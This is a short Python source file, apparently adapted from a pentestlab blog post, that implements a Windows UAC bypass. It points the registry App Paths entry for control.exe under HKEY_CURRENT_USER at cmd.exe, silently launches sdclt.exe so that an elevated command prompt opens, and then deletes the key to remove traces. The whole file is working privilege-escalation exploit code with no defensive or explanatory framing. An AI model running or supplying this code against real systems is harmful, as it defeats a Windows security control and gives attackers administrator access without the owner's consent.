"""
https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/
"""
import os
import sys
import time
import _winreg
import win32api
import win32con

def cmd_path():
	path = "c:/windows/system32/cmd.exe"

	if os.path.isfile(os.path.join(path)) == True:
		return os.path.join(path)
	else:
		return False

def sdclt_control_bypass():
	if (os.path.isfile(os.path.join("c:\windows\system32\sdclt.exe")) == True):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")
			_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
		except Exception as error:
			sys.exit()

		try:
			win32api.ShellExecute(0,None,"c:\windows\system32\sdclt.exe",None,None,win32con.SW_HIDE)
		except Exception as error:
			sys.exit()

		time.sleep(5)

		try:
			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")
		except Exception as error:
			return False
	else:
		sys.exit()
